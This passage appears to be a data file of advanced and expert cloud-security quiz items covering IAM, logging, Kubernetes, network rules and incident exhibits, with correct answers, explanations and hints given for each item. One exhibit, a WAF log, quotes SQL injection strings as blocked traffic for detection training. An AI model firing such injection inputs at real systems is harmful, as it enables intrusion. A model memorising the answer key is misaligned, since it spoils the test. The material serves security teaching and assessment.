    options: ["Rotate or remove the old keys and move workloads to roles","Add more tags, until the next scheduled review takes place","Change the default region of the account, and keep every key as it is today","Rename the users, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Old, unused long-lived keys are common sources of compromise.",
    hint: "Old keys."
  },
  {
    id: 883, rank: 2, role: "cloud-security", topic: "S3 Access Log Anomaly", difficulty: "ADVANCED",
    exhibit: "203.0.113.9 LIST bucket=hr-archive 200\n203.0.113.9 GET hr-archive/payroll-01.csv 200\n203.0.113.9 GET hr-archive/payroll-02.csv 200\n203.0.113.9 GET hr-archive/payroll-03.csv 200\n... 2,140 GETs in 6 minutes",
    q: "What does this access log pattern suggest?",
    options: ["A static page request that a content network makes to refresh its cache","A normal website visit by a customer who browses several public pages","A scheduled backup","One address listing and downloading many objects quickly"],
    correct: 3, why: "Rapid enumeration and download from one address may indicate data theft.",
    hint: "Volume from one IP."
  },
  {
    id: 884, rank: 2, role: "cloud-security", topic: "Subdomain Takeover Risk", difficulty: "ADVANCED",
    exhibit: "shop-old.example.com. CNAME shop-old-2019.azurewebsites.net.\nResolution: NXDOMAIN (resource deleted)",
    q: "DNS shows a CNAME pointing to a cloud app name that was deleted. What is the BEST action?",
    options: ["Leave it as nobody uses it","Change the TTL value, and the record expires from caches much sooner","Remove the dangling record and review other stale DNS entries","Create a new app with the same name later, once somebody needs it again"],
    correct: 2, why: "Leaving it is the runner-up as it appears unused, but an attacker can claim the name and serve content on your domain.",
    hint: "Dangling record."
  },
  {
    id: 885, rank: 2, role: "cloud-security", topic: "Kubernetes Audit Anomaly", difficulty: "ADVANCED",
    exhibit: "verb: create\nresource: clusterrolebindings\nuser: system:serviceaccount:dev:build-bot\nrequestObject: roleRef=cluster-admin subject=sa:default:tmp",
    q: "Which Kubernetes audit event is the most suspicious?",
    options: ["A config map read by its owner","A deployment scaled up by the pipeline account during the release window","A pod listing by the monitoring account that runs on a regular schedule","A new cluster-admin binding for an unknown service account"],
    correct: 3, why: "Unexpected cluster-admin bindings indicate privilege escalation or persistence.",
    hint: "Cluster-admin grant."
  },
  {
    id: 886, rank: 2, role: "cloud-security", topic: "SCP Evaluation", difficulty: "ADVANCED",
    q: "An SCP denies disabling audit logging, yet a root administrator in a member account tries to stop it. What is the result?",
    options: ["The SCP is ignored","It is denied, as the SCP applies to every identity in the account","It is allowed on weekdays when the security team is available to approve it","It is allowed as a root user is exempt from all organisation rules"],
    correct: 1, why: "SCPs restrict all principals in member accounts, including their root users.",
    hint: "SCPs bind members."
  },
  {
    id: 887, rank: 2, role: "cloud-security", topic: "Lambda Secret Exposure", difficulty: "ADVANCED",
    q: "Database credentials are stored in a function's plain environment variables. What is the best improvement?",
    options: ["Add a comment in the code","Encode it with Base64","Fetch secrets at runtime from a secrets service","Make the variable name shorter, and it is harder to notice in the console"],
    correct: 2, why: "Environment variables are visible to anyone who can read the configuration.",
    hint: "Use a secrets service."
  },
  {
    id: 888, rank: 2, role: "cloud-security", topic: "Drift Detection", difficulty: "ADVANCED",
    q: "The deployed security group has an open SSH rule that is not in the Terraform code. What does this indicate?",
    options: ["A normal result","An encryption error that the key service reports during every deployment run","Drift from a manual change that should be reviewed and reverted","A billing error"],
    correct: 2, why: "Manual changes bypass review and can introduce exposure.",
    hint: "Unmanaged change."
  },
  {
    id: 889, rank: 2, role: "cloud-security", topic: "Cross-Account Access Finding", difficulty: "ADVANCED",
    exhibit: "\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"}\n\"Action\":\"s3:GetObject\"\n\"Resource\":\"arn:aws:s3:::backup-prod/*\"",
    q: "A storage bucket policy grants access to an external account ID that nobody recognises. What should you do?",
    options: ["Ignore it, and review the outcome at the next monthly meeting","Investigate the principal and remove the grant if unapproved","Add more grants, and review the outcome at the next monthly meeting","Assume it belongs to a partner and leave it in place until somebody complains"],
    correct: 1, why: "Unknown external principals may indicate unauthorised sharing or compromise.",
    hint: "Unknown account."
  },
  {
    id: 890, rank: 2, role: "cloud-security", topic: "WAF Log Reading", difficulty: "ADVANCED",
    exhibit: "10:02:01 BLOCK rule=SQLi-QueryArgs src=198.51.100.7 uri=/search?q=1' OR '1'='1\n10:02:02 BLOCK rule=SQLi-QueryArgs src=198.51.100.7 uri=/search?q=1;DROP TABLE\n10:02:03 BLOCK rule=SQLi-Body src=198.51.100.7 uri=/login",
    q: "What do these WAF log entries suggest?",
    options: ["A load balancer health check that the service sends every few seconds to the app","Repeated injection attempts from one source that are blocked","A normal user session","A software update"],
    correct: 1, why: "Repeated blocked rule matches from one client suggest automated probing.",
    hint: "Same rule, same source."
  },
  {
    id: 891, rank: 2, role: "cloud-security", topic: "Data Perimeter", difficulty: "ADVANCED",
    q: "An organisation wants to ensure its data can only be accessed by its own identities from its own networks. What is the BEST design?",
    options: ["Enable only logging","Rely on strong passwords for users","Organisation-wide resource policies, endpoint policies and network conditions, in most cases","Public sharing links that expire after seven days, and need no sign-in at all for the recipient"],
    correct: 2, why: "Strong passwords are the runner-up since they are familiar, but they cannot prevent a valid credential being used from outside.",
    hint: "Identity and network conditions."
  },
  {
    id: 892, rank: 2, role: "cloud-security", topic: "Orphaned Snapshot Review", difficulty: "ADVANCED",
    q: "Which risk is created by old unencrypted disk snapshots shared across accounts?",
    options: ["Faster restores","Data exposure from forgotten and uncontrolled copies","Lower cost","Improved restore performance as there are more copies of the same disk available"],
    correct: 1, why: "Forgotten snapshots may contain sensitive data and weak permissions.",
    hint: "Forgotten copies."
  },
  {
    id: 893, rank: 2, role: "cloud-security", topic: "Detecting Role Chaining", difficulty: "ADVANCED",
    exhibit: "02:10:01 AssumeRole acct=111 role=dev-reader src=203.0.113.44\n02:10:19 AssumeRole acct=222 role=ops-admin src=203.0.113.44\n02:10:44 AssumeRole acct=333 role=data-export src=203.0.113.44",
    q: "Which log pattern best indicates an attacker chaining role assumptions to move across accounts?",
    options: ["A billing report","Several AssumeRole events across accounts from one new address","A single login by a user","A storage listing made by an auditor who reviews the buckets during working hours"],
    correct: 1, why: "Successive assumptions from a new source suggest lateral movement.",
    hint: "Chain of AssumeRole."
  },
  {
    id: 894, rank: 2, role: "cloud-security", topic: "Managed Identity Misuse", difficulty: "ADVANCED",
    q: "In a managed cloud service, an application's identity has contributor rights on the whole subscription. What is the best remediation?",
    options: ["Remove all roles from everyone, then record the result in the ticket","Disable monitoring","Add another identity with the same rights, and review the outcome at the next monthly meeting","Scope the role to the specific resources and actions required"],
    correct: 3, why: "Right-sizing and scoping reduce blast radius.",
    hint: "Scope it down."
  },
  {
    id: 895, rank: 2, role: "cloud-security", topic: "Instance Isolation Procedure", difficulty: "ADVANCED",
    q: "A virtual machine is suspected of compromise. What is the BEST cloud-native containment step that preserves evidence?",
    options: ["Isolate with a security group, then snapshot disks and capture memory","Terminate the instance immediately","Delete the security group, and the instance loses all of its network access at once","Reboot it repeatedly"],
    correct: 0, why: "Terminating is the runner-up since it stops the threat, but it destroys volatile evidence and may remove forensic data.",
    hint: "Isolate, then capture."
  },
  {
    id: 896, rank: 2, role: "cloud-security", topic: "Key Usage Anomaly", difficulty: "ADVANCED",
    q: "Which KMS event best suggests misuse of an encryption key?",
    options: ["A routine encryption call that the application makes whenever it saves a customer record","A key description change by the owner","Key rotation on schedule","A burst of Decrypt calls from an unusual principal at night"],
    correct: 3, why: "Unusual decrypt volume may show bulk data access.",
    hint: "Decrypt burst."
  },
  {
    id: 897, rank: 2, role: "cloud-security", topic: "Public Container Registry", difficulty: "ADVANCED",
    q: "A container registry repository is set to public and contains internal images. What is the best action?",
    options: ["Make it private, review pulls and rotate any baked-in secrets","Leave it public","Change the image tag","Delete the registry name, and recreate a similar repository whenever it is needed again"],
    correct: 0, why: "Images often contain secrets and proprietary code.",
    hint: "Private and review."
  },
  {
    id: 898, rank: 2, role: "cloud-security", topic: "Org-Wide Logging Gap", difficulty: "ADVANCED",
    q: "An audit finds that two of fifty accounts have no audit trail enabled. What is the best structural fix?",
    options: ["Enforce an organisation trail and block anyone from disabling it","Ask account owners to enable the trail themselves when they next have time to do it","Accept the risk, and review the outcome at the next monthly meeting","Review them annually, until the next scheduled review takes place"],
    correct: 0, why: "Central enforcement prevents gaps.",
    hint: "Enforce centrally."
  },
  {
    id: 899, rank: 2, role: "cloud-security", topic: "Token Lifetime Review", difficulty: "ADVANCED",
    q: "Which setting best reduces the impact of stolen cloud console sessions?",
    options: ["Short sessions with re-authentication and conditional access","Disabling MFA, and revisit the decision after the next release","Sharing sessions, until the next scheduled review takes place","Very long sessions for convenience, and staff never have to sign in again at work"],
    correct: 0, why: "Shorter sessions limit the window of misuse.",
    hint: "Short sessions."
  },
  {
    id: 900, rank: 2, role: "cloud-security", topic: "Egress Control Finding", difficulty: "ADVANCED",
    q: "Servers in a private subnet have unrestricted outbound internet access. What is the main risk?",
    options: ["Lower availability","Higher storage cost caused by the extra log volume that the traffic would generate","Malware can reach command servers and data can leave unseen","Slower deployments"],
    correct: 2, why: "Egress filtering and monitoring limit post-compromise activity.",
    hint: "Unrestricted egress."
  },
  {
    id: 901, rank: 2, role: "cloud-security", topic: "CSPM Prioritisation", difficulty: "ADVANCED",
    q: "A posture tool reports 5,000 findings. What is the BEST triage approach?",
    options: ["Fix findings in alphabetical order, and every team can follow the queue easily","Rank by exposure and data sensitivity and fix toxic mixes first","Fix only the oldest findings, and close the rest once the backlog gets smaller","Suppress all low findings, and review the remaining ones at the next audit round"],
    correct: 1, why: "Oldest first is the runner-up since it clears backlog, but age says little about risk.",
    hint: "Toxic combinations."
  },
  {
    id: 902, rank: 2, role: "cloud-security", topic: "Service Account Key Policy", difficulty: "ADVANCED",
    q: "A cloud project allows creation of user-managed service account keys. What control is best?",
    options: ["Allow it everywhere","Share keys by email","Disable key creation by policy, and use workload identity instead, in most cases","Rotate by memory"],
    correct: 2, why: "Preventive policy removes the long-lived key risk.",
    hint: "Disable keys."
  },
  {
    id: 903, rank: 2, role: "cloud-security", topic: "Peering Routing Risk", difficulty: "ADVANCED",
    q: "Two networks are peered. Why must route tables and security groups still be reviewed?",
    options: ["Peering blocks all traffic","Peering encrypts all traffic automatically and and removes any need for further rules","Peering removes the need for firewalls, until the next scheduled review takes place","Peering gives reachability, so open rules expose resources, as a first step"],
    correct: 3, why: "Connectivity does not imply authorisation.",
    hint: "Reachability is not trust."
  },
  {
    id: 904, rank: 2, role: "cloud-security", topic: "Metadata Service Alert", difficulty: "ADVANCED",
    q: "An alert shows a container calling the instance metadata endpoint for role credentials. What does this suggest?",
    options: ["A scheduled backup","Normal DNS","A CPU spike","Possible credential theft from the node if the pod should not need the node role"],
    correct: 3, why: "Pods normally use workload identity, not the node's credentials.",
    hint: "Pod asking for node creds."
  },
  {
    id: 905, rank: 2, role: "cloud-security", topic: "Backup Plan Gaps", difficulty: "ADVANCED",
    q: "A restore test fails because the encryption key was deleted. What lesson applies?",
    options: ["Use shorter keys, and review the outcome at the next monthly meeting","Keys are not important","Protect keys and include them in recovery tests","Backups do not need testing once the first successful copy has been completed"],
    correct: 2, why: "Backups are useless without the keys.",
    hint: "Keys in the plan."
  },
  {
    id: 906, rank: 2, role: "cloud-security", topic: "Cloud DLP Use", difficulty: "ADVANCED",
    q: "How can cloud data loss prevention help protect stored data?",
    options: ["By lowering the bill","By deleting logs","By speeding up queries","By discovering and classifying sensitive data and applying controls or alerts"],
    correct: 3, why: "Discovery enables targeted controls.",
    hint: "Find sensitive data."
  },
  {
    id: 907, rank: 2, role: "cloud-security", topic: "Overly Broad Network Rule", difficulty: "ADVANCED",
    q: "Which rule most clearly violates least privilege?",
    options: ["Allow 443 from the load balancer to the app tier, as a first step","Allow DNS to the resolver","Allow 5432 from the app tier to the database, until the next scheduled review takes place","Allow all protocols from 0.0.0.0/0 to the database subnet"],
    correct: 3, why: "Exposing everything from anywhere to the database is unrestricted exposure.",
    hint: "All from anywhere."
  },
  {
    id: 908, rank: 2, role: "cloud-security", topic: "Break Glass Review", difficulty: "ADVANCED",
    q: "What should happen after a break-glass account is used in an emergency?",
    options: ["Review the activity, rotate the credentials and document the justification, and revisit the decision after the next release","Leave the session open","Nothing","Share the password"],
    correct: 0, why: "Emergency access must be accountable and reset.",
    hint: "Review and rotate."
  },
  {
    id: 909, rank: 2, role: "cloud-security", topic: "API Rate and Abuse", difficulty: "ADVANCED",
    q: "A public cloud API is receiving credential stuffing traffic. Which control is best?",
    options: ["Turning off logs, and review the outcome at the next monthly meeting","Rate limiting, bot protection and MFA or token controls at the edge","Adding more servers only, until the next scheduled review takes place","Hiding the API URL, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Edge controls reduce abuse without scaling attackers' success.",
    hint: "Edge controls."
  },
  {
    id: 910, rank: 2, role: "cloud-security", topic: "Encryption Context", difficulty: "ADVANCED",
    q: "Why use encryption context in key requests?",
    options: ["It disables rotation","It hides logs","It shortens keys","It binds ciphertext to a specific purpose and appears in logs for auditing"],
    correct: 3, why: "Context prevents using ciphertext in a different setting.",
    hint: "Bind and audit."
  },
  {
    id: 911, rank: 2, role: "cloud-security", topic: "Resource Ownership Gaps", difficulty: "ADVANCED",
    q: "Many resources have no owner tag and no contact. What is the best action?",
    options: ["Rename the account, and it reflects the department that probably created the resources","Delete everything","Enforce ownership tags and clean up unowned resources","Ignore, and revisit the decision after the next release"],
    correct: 2, why: "Ownership enables response and accountability.",
    hint: "Mandatory owners."
  },
  {
    id: 912, rank: 2, role: "cloud-security", topic: "Pipeline Role Permissions", difficulty: "ADVANCED",
    q: "A deployment pipeline role has permissions to modify IAM and delete logs. What is the BEST improvement?",
    options: ["Add another admin","Share it with the developers","Keep it for flexibility","Restrict it to the deployment actions required and prevent changes to logging, and IAM boundaries"],
    correct: 3, why: "Keeping it for flexibility is the runner-up as pipelines can break, but a compromised pipeline then controls the account.",
    hint: "Scope the pipeline."
  },
  {
    id: 913, rank: 2, role: "cloud-security", topic: "Anomaly in Storage Deletion", difficulty: "ADVANCED",
    q: "Which alert pattern best signals possible ransomware activity in cloud storage?",
    options: ["A new bucket","Mass object overwrite and deletion events by one identity","Normal uploads","A permissions read"],
    correct: 1, why: "Bulk destructive changes are a ransomware signature.",
    hint: "Mass change."
  },
  {
    id: 914, rank: 2, role: "cloud-security", topic: "Compliance Evidence in Cloud", difficulty: "ADVANCED",
    q: "How can a team produce continuous evidence that encryption is enabled on all databases?",
    options: ["Automated configuration rules that report compliance, and non-compliance, in most cases","An email statement","A verbal promise","A manual screenshot each year"],
    correct: 0, why: "Automated checks give timely and verifiable evidence.",
    hint: "Automated rules."
  },
  {
    id: 915, rank: 2, role: "cloud-security", topic: "Third-Party Integration Risk", difficulty: "ADVANCED",
    q: "A SaaS tool asks for broad read and write access to your cloud account. What is the best response?",
    options: ["Grant the minimum scoped role, review its use and monitor it, as a first step","Share a user password","Disable logging for it","Grant administrator"],
    correct: 0, why: "Third parties should have least privilege and monitoring.",
    hint: "Least privilege."
  },
  {
    id: 916, rank: 2, role: "cloud-security", topic: "Auto Scaling and Images", difficulty: "ADVANCED",
    q: "Why should auto-scaling groups use hardened, pre-approved images?",
    options: ["They start faster only","Every new instance starts from a trusted baseline","They need no patching","They cost less only"],
    correct: 1, why: "Consistent baselines avoid insecure variation.",
    hint: "Trusted baseline."
  },
  {
    id: 917, rank: 2, role: "cloud-security", topic: "Open Database Port", difficulty: "ADVANCED",
    exhibit: "sg-0a1 inbound\n443   tcp 10.0.1.0/24   app-lb\n22    tcp 10.9.0.0/16   vpn\n5432  tcp 0.0.0.0/0     any",
    q: "What is the main concern in this security group export?",
    options: ["The database port is open to the whole internet","DNS traffic is allowed to the internal resolver that the platform team operates","The web port is open only to the load balancer that fronts the application tier","SSH is limited to the VPN range that the network team manages and reviews"],
    correct: 0, why: "A database reachable from any address is exposed to scanning and credential attacks.",
    hint: "Look at 0.0.0.0/0."
  },
  {
    id: 918, rank: 2, role: "cloud-security", topic: "Unencrypted Volume Finding", difficulty: "ADVANCED",
    exhibit: "vol-0f3  env=prod  size=500GB  encrypted=false  attached=db-prod-1\nvol-0f4  env=prod  size=200GB  encrypted=true   attached=app-prod-2",
    q: "What does this configuration report show?",
    options: ["A production volume that holds data without encryption","A production volume that is encrypted with a key that the customer manages itself","A volume that was deleted last week after the migration project was finished","A volume that is attached only to a test host, and holds no real data at all"],
    correct: 0, why: "Production data volumes should be encrypted at rest.",
    hint: "Encrypted: false."
  },
  {
    id: 919, rank: 2, role: "cloud-security", topic: "Console Login Alert", difficulty: "ADVANCED",
    exhibit: "ConsoleLogin user=root src=198.51.100.88 country=unexpected MFA=false result=Success\nConsoleLogin user=dev-ana src=10.1.2.3 MFA=true result=Success",
    q: "Which detail makes this sign-in event the most worrying?",
    options: ["A read-only auditor sign-in from the head office network during a review","A developer sign-in with MFA that happens during the normal office hours","A root sign-in from a new country without MFA","A service role that refreshes its session as the scheduled job starts up"],
    correct: 2, why: "Root use without MFA from an unusual place suggests account takeover.",
    hint: "Root and no MFA."
  },
  {
    id: 920, rank: 2, role: "cloud-security", topic: "Shared Responsibility Check", difficulty: "ADVANCED",
    q: "Who is responsible for patching the guest operating system on a customer-managed virtual machine?",
    options: ["The hardware vendor that supplied the physical servers to the provider originally","The provider's data centre staff, who manage every guest system for each customer","The customer who runs the virtual machine","The internet provider that carries the traffic between the customer, and the cloud"],
    correct: 2, why: "In IaaS the customer manages the guest operating system and its patches.",
    hint: "IaaS split."
  },
  {
    id: 921, rank: 3, role: "cloud-security", topic: "Landing Zone Design", difficulty: "EXPERT",
    q: "A company is moving 200 workloads to the cloud. What is the BEST account structure for security?",
    options: ["Separate accounts per environment with central guardrails","One shared account with tags for every team and workload, as a general rule","Two accounts only with manual reviews every quarter, as a general rule","One account per developer with no central governance, as a general rule"],
    correct: 0, why: "One shared account is the runner-up as it is simple to run, but it gives a large blast radius and weak separation of duties.",
    hint: "Blast radius."
  },
  {
    id: 922, rank: 3, role: "cloud-security", topic: "Hub and Spoke Inspection", difficulty: "EXPERT",
    q: "Which design inspects traffic between spoke networks centrally?",
    options: ["Public IP addresses on every workload for easy access","Direct peering between all spokes with no inspection","One flat network that contains every workload together","A hub network with a shared firewall in the path"],
    correct: 3, why: "A hub forces traffic through one inspection point.",
    hint: "Central path."
  },
  {
    id: 923, rank: 3, role: "cloud-security", topic: "Policy Evaluation Exhibit", difficulty: "EXPERT",
    exhibit: "Identity policy: Allow ec2:RunInstances on *\nSCP: Deny * when aws:RequestedRegion not in [eu-west-1, eu-west-2]\nRequest: RunInstances region=ap-south-1\nResult: AccessDenied (explicit deny in SCP)",
    q: "Why does this request fail even though the identity policy allows it?",
    options: ["The bucket was created on a weekday by the same team","An organisation policy denies it outside approved regions, in most cases","The role session is too short to finish the request","The identity policy has a typing error in the action name that the console hides"],
    correct: 1, why: "An explicit deny from an organisation guardrail overrides any allow.",
    hint: "Explicit deny wins."
  },
  {
    id: 924, rank: 3, role: "cloud-security", topic: "Key Control for Regulators", difficulty: "EXPERT",
    q: "A regulator requires that the company controls when encryption keys can be used. What is the BEST design?",
    options: ["Keys stored in plain text in the code repository, in most cases","Customer-managed keys with scoped policies and audited use","Provider-owned default keys that the customer cannot see","One shared key for every service and every account, in most cases"],
    correct: 1, why: "Provider-owned keys are the runner-up as they need no work, but the company cannot control or audit their use.",
    hint: "Control and audit."
  },
  {
    id: 925, rank: 3, role: "cloud-security", topic: "Private Connectivity Choice", difficulty: "EXPERT",
    q: "How can a workload reach a cloud storage service without crossing the public internet?",
    options: ["Through a private endpoint inside the virtual network","Through a public IP address, and a firewall rule, in most cases","Through a proxy that sits on a developer laptop, as a general rule","Through a shared password sent over email, in most cases"],
    correct: 0, why: "Private endpoints keep traffic on the provider's private network.",
    hint: "Private endpoint."
  },
  {
    id: 926, rank: 3, role: "cloud-security", topic: "Pipeline Federation", difficulty: "EXPERT",
    q: "How should a pipeline in an external system get cloud access without stored keys?",
    options: ["Federate its identity, and issue short-lived tokens, in most cases","Store a long-lived key in a pipeline variable, in the first instance","Share a user password with the pipeline team, where that is practical","Create one admin account for every pipeline job, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Federation removes long-lived secrets.",
    hint: "Short-lived tokens."
  },
  {
    id: 927, rank: 3, role: "cloud-security", topic: "Network Policy Exhibit", difficulty: "EXPERT",
    exhibit: "kind: NetworkPolicy\nmetadata: name=payments-ingress namespace=payments\nspec:\n  podSelector: {}\n  policyTypes: [Ingress]\n  ingress:\n  - from: [{podSelector: {matchLabels: {tier: web}}}]",
    q: "What is the effect of this Kubernetes network policy?",
    options: ["All pods in the cluster accept traffic from anywhere","Pods in other namespaces may reach the payments pods freely","Pods in the payments namespace accept traffic only from the web tier, in most cases","The web tier cannot send any traffic at all"],
    correct: 2, why: "Ingress rules limit allowed sources to the labelled web tier.",
    hint: "Ingress from podSelector."
  },
  {
    id: 928, rank: 3, role: "cloud-security", topic: "Multi-Region Resilience", difficulty: "EXPERT",
    q: "A critical service must survive the loss of a whole region. What is the BEST approach?",
    options: ["Daily backups kept in the same region as production, in most cases","A runbook that nobody has tried in an exercise","A bigger instance in the primary region only, in most cases","Active replication to a second region with tested failover"],
    correct: 3, why: "Same-region backups are the runner-up as they protect data, but they do not survive a regional outage.",
    hint: "Region loss."
  },
  {
    id: 929, rank: 3, role: "cloud-security", topic: "Secrets Rotation Design", difficulty: "EXPERT",
    q: "Which design lets database passwords rotate without application downtime?",
    options: ["A password stored in a config file for each release, in most cases","A shared spreadsheet that the team updates by hand, as a general rule","A secrets service that rotates and apps that fetch current values","A password that is never changed to avoid breakage"],
    correct: 2, why: "Dynamic retrieval lets rotation happen without code changes.",
    hint: "Fetch current value."
  },
  {
    id: 930, rank: 3, role: "cloud-security", topic: "Guardrail Exhibit", difficulty: "EXPERT",
    exhibit: "{\"Effect\":\"Deny\",\"Action\":[\"cloudtrail:StopLogging\",\"cloudtrail:DeleteTrail\",\"cloudtrail:UpdateTrail\"],\"Resource\":\"*\"}",
    q: "What does this guardrail prevent in member accounts?",
    options: ["Reading the audit trail from the security account, until the next scheduled review takes place","Creating new storage buckets for any team, and revisit the decision after the next release","Using any compute service in approved regions, then record the result in the ticket","Turning off or changing the organisation audit trail, wherever possible"],
    correct: 3, why: "The deny blocks disabling or altering central logging.",
    hint: "Deny on trail actions."
  },
  {
    id: 931, rank: 3, role: "cloud-security", topic: "Ephemeral Environments", difficulty: "EXPERT",
    q: "Why are short-lived test environments created from code safer than long-lived hand-built ones?",
    options: ["They are always cheaper than production","They allow developers to skip peer review","They never need any security controls at all as they only exist for a short time","They are consistent, and removed before drift builds up"],
    correct: 3, why: "Disposable, repeatable environments reduce drift and forgotten exposure.",
    hint: "Disposable."
  },
  {
    id: 932, rank: 3, role: "cloud-security", topic: "Shared Services Account", difficulty: "EXPERT",
    q: "Which account should hold the central security tooling and logs?",
    options: ["Any account that has a spare budget available","The sandbox account used by new developers, in most cases","The production account that runs customer workloads, in most cases","A dedicated security account with restricted access"],
    correct: 3, why: "Separate accounts protect evidence from workload administrators.",
    hint: "Separation of duties."
  },
  {
    id: 933, rank: 3, role: "cloud-security", topic: "Enclave Protection", difficulty: "EXPERT",
    q: "What does confidential computing add for sensitive workloads?",
    options: ["Protection of data in use inside a hardware enclave, as a general rule","Free storage for archived logs","Faster network speeds between regions for workloads that move large datasets daily","Automatic removal of every old user"],
    correct: 0, why: "It protects data while it is being processed.",
    hint: "Data in use."
  },
  {
    id: 934, rank: 3, role: "cloud-security", topic: "Edge Protection Design", difficulty: "EXPERT",
    q: "A public API faces large volumetric attacks. What is the BEST layered defence?",
    options: ["A longer DNS record lifetime for the endpoint, as a general rule","A content network with DDoS protection and WAF rules","Blocking every address from outside the country, in the first instance","Larger servers behind a single public address, as a general rule"],
    correct: 1, why: "Larger servers are the runner-up as they add capacity, but they cannot absorb attacks at internet scale.",
    hint: "Absorb at the edge."
  },
  {
    id: 935, rank: 3, role: "cloud-security", topic: "Log Pipeline Exhibit", difficulty: "EXPERT",
    exhibit: "log_destination: s3://app-prod-logs (account 111122223333, same as workload)\nretention_days: 365\nversioning: off\nobject_lock: off\nwriters: app-admin-role, ci-role",
    q: "What is wrong with this logging configuration?",
    options: ["Logs are encrypted with a customer-managed key and kept for the required period of time","Logs are retained for the required period","Logs are sent to an immutable bucket","Logs sit in the same account that attackers could control, as a general rule"],
    correct: 3, why: "Evidence stored where an intruder has admin rights can be deleted or altered.",
    hint: "Where do logs live?"
  },
  {
    id: 936, rank: 3, role: "cloud-security", topic: "Tenant Isolation", difficulty: "EXPERT",
    q: "Which design best isolates customers in a multi-tenant cloud application?",
    options: ["Trusting the client to send only its own records, until the next scheduled review takes place","A tenant name typed in each page header, as a general rule","Per-tenant identity and data scoping enforced by policy","One shared database user for every tenant, as a general rule"],
    correct: 2, why: "Isolation must be enforced on the server side.",
    hint: "Enforce server side."
  },
  {
    id: 937, rank: 3, role: "cloud-security", topic: "Zero Trust Access", difficulty: "EXPERT",
    q: "Which principle best describes zero trust access to cloud admin consoles?",
    options: ["Trust anyone who is inside the office network","Allow any user who knows the console address, where that is practical","Grant standing admin rights to all engineers, until the next scheduled review takes place","Verify each request using identity and device posture"],
    correct: 3, why: "Zero trust assesses every request rather than the network location.",
    hint: "Never trust by location."
  },
  {
    id: 938, rank: 3, role: "cloud-security", topic: "Infrastructure Code Review", difficulty: "EXPERT",
    q: "What should a security review of infrastructure code check before deployment?",
    options: ["Policies and templates scanned for insecure settings, in most cases","Only the cost estimate of each resource","Only the colour scheme of the dashboards","Only the names of the files in the repository"],
    correct: 0, why: "Pre-deployment scans catch misconfigurations early.",
    hint: "Shift left."
  },
  {
    id: 939, rank: 3, role: "cloud-security", topic: "Image Supply Chain", difficulty: "EXPERT",
    q: "What is the BEST way for a platform team to ensure only trusted container images run in production?",
    options: ["Any image from public registries pulled by tag, as a general rule","Images pulled once and trusted forever","Images built on laptops, and copied to servers","Signed images from a private registry with admission checks"],
    correct: 3, why: "Pulling from public registries is the runner-up as it is convenient, but it gives no assurance about image origin or content.",
    hint: "Signed and verified."
  },
  {
    id: 940, rank: 3, role: "cloud-security", topic: "Cloud Incident Exhibit", difficulty: "EXPERT",
    exhibit: "RunInstances x 412  user=ci-deploy  src=203.0.113.77\nRegions: ap-southeast-2 (118) sa-east-1 (141) eu-north-1 (153)\nInstance type: p4d.24xlarge\nDaily cost: 2,100 -> 61,400 USD",
    q: "What is the most likely cause of this spike in cost and activity?",
    options: ["Stolen keys used to start many instances in unused regions, as a general rule","A change to the colour of the console","A normal increase from the scheduled backup that finance approved at the start of the year","A reduced number of users logging in"],
    correct: 0, why: "Mining or abuse often appears as instances in regions the company never uses.",
    hint: "Unused regions."
  },
  {
    id: 941, rank: 3, role: "cloud-security", topic: "Data Residency Design", difficulty: "EXPERT",
    q: "A legal rule requires customer data to stay in one country. Which control best enforces this?",
    options: ["Trusting developers to remember it, and revisit the decision after the next release","Region restrictions in organisation policy and replication rules, in most cases","A reminder at the weekly meeting","A note in the onboarding document"],
    correct: 1, why: "Technical guardrails enforce the rule automatically.",
    hint: "Technical guardrails."
  },
  {
    id: 942, rank: 3, role: "cloud-security", topic: "Break Glass Design", difficulty: "EXPERT",
    q: "What is a sound design for emergency administrator access?",
    options: ["No emergency access at all","One shared admin password written on a wiki page, in most cases","Permanent admin rights for the entire team, as a general rule","Sealed accounts with strong MFA and alerts on any use"],
    correct: 3, why: "Emergency access should be rare and fully alerted.",
    hint: "Alert on use."
  },
  {
    id: 943, rank: 3, role: "cloud-security", topic: "Serverless Permission Exhibit", difficulty: "EXPERT",
    exhibit: "Function: order-processor\nRole policy: {\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}\nTriggers: public API gateway route /orders",
    q: "What is the main problem in this function role?",
    options: ["It allows writing to one log stream","It allows reading one queue only","It grants all actions on all resources","It limits access to a single table"],
    correct: 2, why: "A wildcard role gives an attacker full reach if the function is compromised.",
    hint: "Look at the Action."
  },
  {
    id: 944, rank: 3, role: "cloud-security", topic: "Network Segmentation Exhibit", difficulty: "EXPERT",
    exhibit: "rt-dev:\n10.1.0.0/16  local\n10.2.0.0/16  pcx-dev-prod  (prod databases)\n0.0.0.0/0    igw-1\nNo network ACL restricts 10.2.0.0/16",
    q: "What risk does this route table create?",
    options: ["The logging network is isolated from every host","The backup network is missing","The development network can reach production databases directly","The production network cannot reach the internet"],
    correct: 2, why: "Open routes between environments remove separation.",
    hint: "Dev to prod route."
  },
  {
    id: 945, rank: 3, role: "cloud-security", topic: "Cloud Governance Metrics", difficulty: "EXPERT",
    q: "Which metric best shows that cloud guardrails are working?",
    options: ["The share of accounts that meet baseline controls over time, as a general rule","The number of dashboards that exist","The number of meetings the team has held","The size of the security budget alone"],
    correct: 0, why: "Compliance coverage over time shows outcomes.",
    hint: "Outcome metric."
  },
  {
    id: 946, rank: 3, role: "cloud-security", topic: "Vendor Lock-In Trade-Off", difficulty: "EXPERT",
    q: "Which trade-off should an architect weigh when using provider-specific security services?",
    options: ["Higher cost with no integration at all, as a general rule","Lower security with easier migration, in most cases","No trade-off exists at all","Deeper integration against harder migration later"],
    correct: 3, why: "Native services integrate well but raise switching costs.",
    hint: "Integration versus portability."
  },
  {
    id: 947, rank: 3, role: "cloud-security", topic: "Quarantine Pattern", difficulty: "EXPERT",
    q: "A storage bucket receives untrusted uploads. What is the BEST pattern before the files reach users?",
    options: ["Serve uploads directly to all users at once","Trust the file type given by the uploader, and revisit the decision after the next release","Scan in an isolated quarantine bucket then release clean files, in the first instance","Rename the files with a safe extension only, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Serving directly is the runner-up as it is fast, but infected or malicious files would reach users unscanned.",
    hint: "Scan first."
  },
  {
